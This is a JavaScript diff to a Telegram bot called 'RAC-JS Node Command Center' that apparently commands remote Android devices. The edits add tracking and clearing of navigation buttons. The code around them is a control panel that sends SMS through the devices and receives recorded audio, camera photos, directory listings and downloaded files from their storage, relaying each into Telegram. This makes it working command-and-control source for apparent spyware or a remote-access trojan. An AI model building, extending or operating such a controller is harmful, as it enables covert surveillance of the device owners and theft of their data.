@@ -210,6 +210,24 @@ const devicePaths = {};
 const pathMap = {}; // Untuk by-pass limit 64-char callback_data Telegram
 const lsState = {}; // Cache untuk pagination: devId -> { path, items, page, totalPages }
 const activeInput = {}; // Tracker untuk perintah yang menunggu input pengguna: chatId -> { devId, command }
+const lastNavMessage = {}; // Tracker ID pesan terakhir yang punya tombol navigasi: chatId -> msgId
+
+// Helper untuk menghapus tombol navigasi di pesan sebelumnya
+const clearPreviousNav = async (chatId) => {
+    if (lastNavMessage[chatId] && bot) {
+        try {
+            await bot.telegram.editMessageReplyMarkup(chatId, lastNavMessage[chatId], null, { inline_keyboard: [] });
+        } catch (e) {
+            // Abaikan jika pesan sudah dihapus atau terlalu lama
+        }
+        delete lastNavMessage[chatId];
+    }
+};
+
+// Helper untuk mencatat pesan navigasi baru
+const trackNav = (chatId, msgId) => {
+    lastNavMessage[chatId] = msgId;
+};
 
 const commandsWithArgs = {
     'sms_send': 'Masukkan Detail SMS (Format: Nomor|Pesan):',
@@ -287,14 +305,19 @@ const sendExplorerPage = async (client_id, pageNum, chat_id, message_id = null) 
 
     const caption = `📂 <b>File Explorer [${escapeHTML(client_id)}]</b>\n\n📍 Lokasi: <code>${escapeHTML(state.path)}</code>\n📄 Halaman: ${pageNum} dari ${state.totalPages}\n<i>(Klik 📄 File untuk Download)</i>`;
 
+    await clearPreviousNav(chat_id);
+
     try {
+        let sent;
         if (message_id) {
-            await bot.telegram.editMessageText(chat_id, message_id, null, caption, { parse_mode: 'HTML', reply_markup: { inline_keyboard: inlineBtns } });
+            sent = await bot.telegram.editMessageText(chat_id, parseInt(message_id), null, caption, { parse_mode: 'HTML', reply_markup: { inline_keyboard: inlineBtns } });
         } else {
-            await bot.telegram.sendMessage(chat_id, caption, { parse_mode: 'HTML', reply_markup: { inline_keyboard: inlineBtns } });
+            sent = await bot.telegram.sendMessage(chat_id, caption, { parse_mode: 'HTML', reply_markup: { inline_keyboard: inlineBtns } });
         }
+        if (sent?.message_id) trackNav(chat_id, sent.message_id);
     } catch (tgErr) {
-        await bot.telegram.sendMessage(chat_id, '❌ Telegram menolak render tombol direktori: ' + tgErr.message);
+        const sent = await bot.telegram.sendMessage(chat_id, '❌ Telegram menolak render tombol direktori: ' + tgErr.message);
+        if (sent?.message_id) trackNav(chat_id, sent.message_id);
     }
 };
 
@@ -385,34 +408,43 @@ Format Eksekusi Manual:
         sendHelpMessage(ctx);
     });
 
-    bot.start((ctx) => {
+    bot.start(async (ctx) => {
         clearActiveInput(ctx);
+        const chatId = ctx.chat.id;
+        await clearPreviousNav(chatId);
+        
         const msg = `⚡ <b>RAC-JS Node Command Center</b> ⚡\n\nSelamat datang di Control Panel. Silakan pilih menu di bawah ini:`;
-        ctx.reply(msg, {
+        const sent = await ctx.reply(msg, {
             parse_mode: 'HTML',
             ...Markup.inlineKeyboard([
                 [Markup.button.callback('🔍 Lihat Perangkat Aktif', 'btn_list')],
                 [Markup.button.callback('📖 Bantuan & Dokumentasi', 'btn_help')]
             ])
         });
+        trackNav(chatId, sent.message_id);
     });
 
     bot.command('list', async (ctx) => {
         clearActiveInput(ctx);
+        await clearPreviousNav(ctx.chat.id);
         listDevicesToChat(ctx);
     });
     bot.action('btn_list', async (ctx) => {
         ctx.answerCbQuery();
+        await clearPreviousNav(ctx.chat.id);
         listDevicesToChat(ctx);
     });
 
     const listDevicesToChat = async (ctx) => {
         const devices = await db.all('SELECT * FROM devices');
         const isCallback = ctx.callbackQuery ? true : false;
+        const chatId = ctx.chat?.id || ctx.callbackQuery?.message?.chat?.id;
 
         if (devices.length === 0) {
             const msg = '📭 Belum ada perangkat yang terhubung ke server.';
-            return isCallback ? ctx.editMessageText(msg) : ctx.reply(msg);
+            const sent = isCallback ? await ctx.editMessageText(msg) : await ctx.reply(msg);
+            if (sent?.message_id) trackNav(chatId, sent.message_id);
+            return;
         }
 
         const buttons = [];
@@ -426,11 +458,17 @@ Format Eksekusi Manual:
         const caption = '📱 <b>Pilih Target Perangkat:</b>';
         const opts = { parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } };
 
-        if (isCallback) {
-            try { await ctx.editMessageText(caption, opts); }
-            catch (e) { await ctx.reply(caption, opts); }
-        } else {
-            ctx.reply(caption, opts);
+        try {
+            let sent;
+            if (isCallback) {
+                sent = await ctx.editMessageText(caption, opts);
+            } else {
+                sent = await ctx.reply(caption, opts);
+            }
+            if (sent?.message_id) trackNav(chatId, sent.message_id);
+        } catch (e) {
+            const sent = await ctx.reply(caption, opts);
+            if (sent?.message_id) trackNav(chatId, sent.message_id);
         }
     };
 
@@ -489,10 +527,15 @@ Format Eksekusi Manual:
         menuBtns.push([{ text: '🔄 Ganti Perangkat', callback_data: 'list_devices', style: 'primary' }]);
         const opts = { parse_mode: 'HTML', reply_markup: { inline_keyboard: menuBtns } };
 
+        const chatId = ctx.chat?.id || ctx.callbackQuery?.message?.chat?.id;
+        await clearPreviousNav(chatId);
+
         try {
-            await ctx.editMessageText(caption, opts);
+            const sent = await ctx.editMessageText(caption, opts);
+            if (sent?.message_id) trackNav(chatId, sent.message_id);
         } catch (e) {
-            await ctx.reply(caption, opts);
+            const sent = await ctx.reply(caption, opts);
+            if (sent?.message_id) trackNav(chatId, sent.message_id);
         }
     };
 
@@ -619,10 +662,13 @@ Format Eksekusi Manual:
                 [Markup.button.callback('🔙 Selesai & Kembali ke Menu', `select_dev:${devId}`)]
             ]);
 
+            await clearPreviousNav(chatId);
+
             const sentMsg = await ctx.reply(`⏳ <b>[${command}]</b> dikirim ke <code>${devId}</code>...\nInput: <code>${escapeHTML(ctx.message.text)}</code>\n<i>Menunggu Respon...</i>`, {
                 parse_mode: 'HTML',
                 reply_markup: exitBtn.reply_markup
             });
+            trackNav(chatId, sentMsg.message_id);
 
             const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [devId]);
             const currentMode = device?.polling_mode || 'normal';
@@ -825,48 +871,59 @@ app.post('/response', async (req, res) => {
                 });
 
                 const sendOrEdit = async (text, options = {}) => {
+                    await clearPreviousNav(cmd.chat_id);
                     const finalOpts = { parse_mode: 'HTML', ...getNavOpts(), ...options };
                     if (cmd.message_id) {
                         try {
-                            await bot.telegram.editMessageText(cmd.chat_id, parseInt(cmd.message_id), null, text, finalOpts);
+                            const sent = await bot.telegram.editMessageText(cmd.chat_id, parseInt(cmd.message_id), null, text, finalOpts);
+                            if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
                         } catch (e) {
-                            await bot.telegram.sendMessage(cmd.chat_id, text, finalOpts);
+                            const sent = await bot.telegram.sendMessage(cmd.chat_id, text, finalOpts);
+                            if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
                         }
                     } else {
-                        await bot.telegram.sendMessage(cmd.chat_id, text, finalOpts);
+                        const sent = await bot.telegram.sendMessage(cmd.chat_id, text, finalOpts);
+                        if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
                     }
                 };
 
                 if (data.type === 'audio_base64') {
+                    await clearPreviousNav(cmd.chat_id);
                     const audioBuffer = Buffer.from(deviceResponse, 'base64');
-                    await bot.telegram.sendAudio(cmd.chat_id, {
+                    const sent = await bot.telegram.sendAudio(cmd.chat_id, {
                         source: audioBuffer,
                         filename: `record_${data.id}.3gp`
                     }, { caption: `✅ <b>Respon Rekaman Suara (${escapeHTML(client_id)})</b>`, parse_mode: 'HTML', ...getNavOpts() });
+                    if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
                     if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
                     return res.json({ status: 'received' });
                 }
 
                 if (data.type === 'photo_base64') {
+                    await clearPreviousNav(cmd.chat_id);
                     const imageBuffer = Buffer.from(deviceResponse, 'base64');
-                    await bot.telegram.sendPhoto(cmd.chat_id, {
+                    const sent = await bot.telegram.sendPhoto(cmd.chat_id, {
                         source: imageBuffer
                     }, { caption: `📸 <b>Respon Jepretan Kamera (${escapeHTML(client_id)})</b>`, parse_mode: 'HTML', ...getNavOpts() });
+                    if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
                     if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
                     return res.json({ status: 'received' });
                 }
 
                 if (data.type === 'file_download' && deviceResponse.name && deviceResponse.data) {
+                    await clearPreviousNav(cmd.chat_id);
                     const fileBuffer = Buffer.from(deviceResponse.data, 'base64');
-                    await bot.telegram.sendDocument(cmd.chat_id, {
+                    const sent = await bot.telegram.sendDocument(cmd.chat_id, {
                         source: fileBuffer,
                         filename: deviceResponse.name
                     }, { caption: `✅ <b>Berhasil Mengunduh File (${escapeHTML(client_id)})</b>\n📂 Nama: ${escapeHTML(deviceResponse.name)}`, parse_mode: 'HTML', ...getNavOpts() });
+                    if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
                     if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
                     return res.json({ status: 'received' });
                 }
 
                 if (data.type === 'ls_result' && Array.isArray(deviceResponse)) {
+                    await clearPreviousNav(cmd.chat_id);
                     const currentPath = devicePaths[client_id] || '/storage/emulated/0';
                     lsState[client_id] = {
                         path: currentPath,
@@ -875,6 +932,7 @@ app.post('/response', async (req, res) => {
                         totalPages: Math.max(1, Math.ceil(deviceResponse.length / 30))
                     };
                     await sendExplorerPage(client_id, 1, cmd.chat_id, cmd.message_id);
+                    // sendExplorerPage handle trackNav inside
                     return res.json({ status: 'received' });
                 }
 
